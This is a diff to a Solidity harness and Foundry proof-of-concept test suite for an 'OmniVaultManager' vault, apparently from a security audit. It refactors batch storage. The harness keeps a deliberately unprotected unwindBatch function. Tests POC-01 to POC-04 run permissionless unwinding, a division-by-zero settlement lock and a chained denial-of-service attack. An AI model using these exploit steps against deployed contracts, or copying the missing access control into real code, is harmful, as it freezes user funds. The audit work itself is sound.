@@ -212,11 +212,16 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
     uint256 public batchStartTime;
     uint256 public pendingRequestCount;
 
-    mapping(uint256 => BatchState)   public completedBatches;
+    // Store BatchState fields separately to avoid tuple-vs-struct getter issues
+    mapping(uint256 => uint32)      public batchFinalizedAt;
+    mapping(uint256 => BatchStatus) public batchStatus;
+    mapping(uint256 => bytes32)     public batchDepositHash;
+    mapping(uint256 => bytes32)     public batchWithdrawalHash;
+    mapping(uint256 => bytes32)     public batchStateHash;
+
     mapping(uint256 => RequestLimit) public vaultRequestLimits;
     mapping(address => RequestLimit) public userRequestLimits;
 
-    // Simulated transient storage (mapping instead of tstore/tload)
     mapping(bytes32 => uint256) private _tstorage;
 
     modifier onlyAdmin()   { require(msg.sender == admin,   "not admin");   _; }
@@ -256,19 +261,18 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
         VaultState[] calldata _vaults
     ) external onlySettler {
         uint256 batchId = currentBatchId;
-        BatchState storage batch = completedBatches[batchId];
-        require(batch.status == BatchStatus.NONE, "VM-BSNN-01");
+        require(batchStatus[batchId] == BatchStatus.NONE, "VM-BSNN-01");
 
         if (batchId > 0) {
-            BatchStatus prev = completedBatches[batchId - 1].status;
+            BatchStatus prev = batchStatus[batchId - 1];
             require(prev == BatchStatus.SETTLED || prev == BatchStatus.UNWOUND, "VM-PBNS-01");
         }
 
-        batch.stateHash      = keccak256(abi.encode(_prices, _vaults));
-        batch.finalizedAt    = uint32(block.timestamp);
-        batch.status         = BatchStatus.FINALIZED;
-        batch.withdrawalHash = rollingWithdrawalHash;
-        batch.depositHash    = rollingDepositHash;
+        batchStateHash[batchId]      = keccak256(abi.encode(_prices, _vaults));
+        batchFinalizedAt[batchId]    = uint32(block.timestamp);
+        batchStatus[batchId]         = BatchStatus.FINALIZED;
+        batchWithdrawalHash[batchId] = rollingWithdrawalHash;
+        batchDepositHash[batchId]    = rollingDepositHash;
 
         for (uint16 i = 0; i < _prices.length; i++) {
             _tstore(keccak256(abi.encode("PRICE", i)), _prices[i]);
@@ -355,9 +359,8 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
         WithdrawalFufillment[] calldata _withdrawals
     ) external onlySettler {
         uint256 prevBatchId = currentBatchId - 1;
-        BatchState storage batch = completedBatches[prevBatchId];
-        require(batch.status == BatchStatus.FINALIZED, "VM-BSNF-01");
-        require(keccak256(abi.encode(_prices, _vaults)) == batch.stateHash, "VM-IVSH-01");
+        require(batchStatus[prevBatchId] == BatchStatus.FINALIZED, "VM-BSNF-01");
+        require(keccak256(abi.encode(_prices, _vaults)) == batchStateHash[prevBatchId], "VM-IVSH-01");
 
         bytes32 depHash;
         for (uint256 i = 0; i < _deposits.length; i++) {
@@ -372,7 +375,7 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
             uint256 sharesToMint = _calcSharesToMint(vid, dep.tokenIds, dep.amounts);
             MockOmniVaultShare(vaultDetails[vid].shareToken).mint(vid, user, sharesToMint);
         }
-        require(depHash == batch.depositHash, "VM-DHMR-01");
+        require(depHash == batchDepositHash[prevBatchId], "VM-DHMR-01");
 
         bytes32 wdHash;
         for (uint256 i = 0; i < _withdrawals.length; i++) {
@@ -400,12 +403,12 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
             MockOmniVaultShare(vaultDetails[vid].shareToken).burn(vid, uint256(req.shares));
             MockExecutorSub(vaultDetails[vid].executor).dispatchAssets(user, syms, amts);
         }
-        require(wdHash == batch.withdrawalHash, "VM-WHMR-01");
-        batch.status = BatchStatus.SETTLED;
+        require(wdHash == batchWithdrawalHash[prevBatchId], "VM-WHMR-01");
+        batchStatus[prevBatchId] = BatchStatus.SETTLED;
     }
 
     // ---- VULNERABLE: no access control ----------------------------------------
-    // BUG: missing onlyRole(SETTLER_ROLE) -- anyone can call after RECLAIM_DELAY
+    // BUG: missing onlySettler -- anyone can call after RECLAIM_DELAY
     function unwindBatch(
         DepositFufillment[] calldata _deposits,
         WithdrawalFufillment[] calldata _withdrawals
@@ -437,8 +440,8 @@ contract OmniVaultManagerHarness is IOmniVaultManagerTypes {
         }
         require(withdrawalHash == rollingWithdrawalHash, "VM-WHMR-01");
 
-        completedBatches[currentBatchId].status      = BatchStatus.UNWOUND;
-        completedBatches[currentBatchId].finalizedAt = uint32(block.timestamp);
+        batchStatus[currentBatchId]      = BatchStatus.UNWOUND;
+        batchFinalizedAt[currentBatchId] = uint32(block.timestamp);
         _resetBatch();
     }
 
@@ -579,11 +582,11 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
     // -------------------------------------------------------------------------
     // POC-01: unwindBatch missing access control
     // -------------------------------------------------------------------------
-    // VULNERABILITY: unwindBatch() has no onlyRole(SETTLER_ROLE)
+    // VULNERABILITY: unwindBatch() has no onlySettler modifier
     // IMPACT: Any EOA can forcibly unwind all pending requests after 24h,
     //         permanently preventing the SETTLER from settling batches.
-    // ATTACK: Monitor TransferRequestUpdate events on-chain to reconstruct
-    //         the full DepositFufillment array, then call unwindBatch().
+    // ATTACK: Reconstruct DepositFufillment array from on-chain events,
+    //         wait 24h, call unwindBatch().
     function testPOC01_UnwindBatchNoAccessControl() public {
         console.log("\n=== POC-01: unwindBatch Missing Access Control ===");
 
@@ -593,19 +596,17 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
         amts[0] = 100e6;
         vm.prank(alice);
         bytes32 aliceReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
-        console.log("[+] Alice deposited 100 USDC, requestId:", vm.toString(aliceReqId));
+        console.log("[+] Alice deposited 100 USDC");
 
         amts[0] = 200e6;
         vm.prank(bob);
         bytes32 bobReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
-        console.log("[+] Bob deposited 200 USDC, requestId:", vm.toString(bobReqId));
+        console.log("[+] Bob deposited 200 USDC");
 
         assertEq(manager.pendingRequestCount(), 2);
-        console.log("[+] Pending requests: 2");
 
         vm.warp(block.timestamp + 24 hours + 1);
 
-        // Attacker reconstructs full arrays from on-chain events (all public)
         DepositFufillment[] memory deps = new DepositFufillment[](2);
         uint16[] memory t1 = new uint16[](1); t1[0] = TOKEN_ID;
         uint256[] memory a1 = new uint256[](1); a1[0] = 100e6;
@@ -625,17 +626,16 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
         console.log("[EXPLOIT] currentBatchId:", manager.currentBatchId());
         assertEq(manager.pendingRequestCount(), 0);
 
-        (, BatchStatus bStatus,,,) = _batchState(manager.currentBatchId() - 1);
-        assertEq(uint(bStatus), uint(BatchStatus.UNWOUND), "batch must be UNWOUND");
+        uint256 prevId = manager.currentBatchId() - 1;
+        assertEq(uint(manager.batchStatus(prevId)), uint(BatchStatus.UNWOUND), "batch must be UNWOUND");
         console.log("[EXPLOIT] Batch status = UNWOUND. SETTLER is blocked.");
     }
 
     // -------------------------------------------------------------------------
     // POC-02: Infinite unwind loop -- permanent DoS
     // -------------------------------------------------------------------------
-    // VULNERABILITY: Each unwind increments batchId and resets request limits.
-    // IMPACT: Attacker repeats indefinitely. Vault never settles.
-    //         Users waste gas re-depositing every 24h.
+    // VULNERABILITY: Each unwind resets batchId and request limits.
+    // IMPACT: Attacker repeats every 24h. Vault never settles.
     function testPOC02_InfiniteUnwindLoop() public {
         console.log("\n=== POC-02: Infinite Unwind Loop ===");
 
@@ -669,9 +669,8 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
     // POC-03: Division by zero in _calcSharesToMint
     // -------------------------------------------------------------------------
     // VULNERABILITY: price=0 => vaultTotalUSD=0, but totalShares != 0
-    //                => (shares * totalShares) / 0 => revert
+    //                => division by zero => bulkSettleState reverts
     // IMPACT: Batch stuck as FINALIZED forever. Funds locked.
-    // TRIGGER: Oracle failure, SETTLER bug, or compromised SETTLER.
     function testPOC03_DivisionByZeroLocksSettlement() public {
         console.log("\n=== POC-03: Division by Zero Locks Funds ===");
 
@@ -682,7 +681,6 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
         bytes32 aliceReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
         console.log("[+] Alice deposited 100 USDC");
 
-        // Settler finalizes with price = 0
         uint256[] memory prices = new uint256[](1); prices[0] = 0;
         VaultState[] memory vaults = _makeVaultState(1000e6);
 
@@ -712,7 +710,7 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
     // POC-04: Chained attack -- compromised SETTLER + unprotected unwind
     // -------------------------------------------------------------------------
     // Step 1: SETTLER finalizes with price=0 => settlement fails (POC-03)
-    // Step 2: After 24h attacker calls unwindBatch => batch advances (POC-01)
+    // Step 2: After 24h attacker unwinds => batch advances (POC-01)
     // Step 3: Repeat => vault permanently non-functional at zero cost
     function testPOC04_ChainedSettlerAndUnwind() public {
         console.log("\n=== POC-04: Chained Attack (POC-01 + POC-03) ===");
@@ -731,14 +729,12 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
         bytes32 aliceId = _requestId(alice, VAULT_ID, 0);
         bytes32 bobId   = _requestId(bob,   VAULT_ID, 0);
 
-        // Compromised/buggy settler finalizes with zeroed prices
         uint256[] memory prices = new uint256[](1); prices[0] = 0;
         VaultState[] memory vaults = _makeVaultState(1000e6);
         vm.prank(settler);
         manager.finalizeBatch(prices, vaults);
         console.log("[+] Settler finalized with price=0");
 
-        // Settlement fails
         DepositFufillment[] memory deps = new DepositFufillment[](2);
         uint16[] memory t = new uint16[](1); t[0] = TOKEN_ID;
         uint256[] memory a1 = new uint256[](1); a1[0] = 100e6;
@@ -750,16 +746,16 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
         vm.prank(settler);
         vm.expectRevert();
         manager.bulkSettleState(prices, vaults, deps, wds);
-        console.log("[+] bulkSettleState failed (division by zero)");
+        console.log("[+] bulkSettleState failed -- division by zero");
 
-        // finalizeBatch called _resetBatch internally, so new batch has no pending requests
-        // rollingDepositHash is now 0, empty array satisfies hash check
+        // finalizeBatch called _resetBatch, new batch has no pending requests
+        // rollingDepositHash == 0, empty array satisfies hash check
         vm.warp(block.timestamp + 24 hours + 1);
         DepositFufillment[] memory emptyDeps = new DepositFufillment[](0);
         vm.prank(attacker);
         manager.unwindBatch(emptyDeps, wds);
 
-        console.log("[EXPLOIT] Chained: finalize(price=0) + settle fails + unwind succeeds");
+        console.log("[EXPLOIT] finalize(price=0) + settle fails + unwind succeeds");
         console.log("[EXPLOIT] batchId:", manager.currentBatchId());
         console.log("[EXPLOIT] Attacker cost: gas only. Vault permanently disrupted.");
     }
@@ -767,13 +763,6 @@ contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {
     // -------------------------------------------------------------------------
     // Helpers
     // -------------------------------------------------------------------------
-
-    function _batchState(uint256 id) internal view returns (
-        uint32, BatchStatus, bytes32, bytes32, bytes32
-    ) {
-        IOmniVaultManagerTypes.BatchState memory b = manager.completedBatches(id);
-        return (b.finalizedAt, b.status, b.depositHash, b.withdrawalHash, b.stateHash);
-    }
 
     function _requestId(address user, uint256 vId, uint256 nonce) internal pure returns (bytes32) {
         return bytes32(((uint256(uint16(vId)) << 240) | (uint256(uint160(user)) << 80)) | nonce);
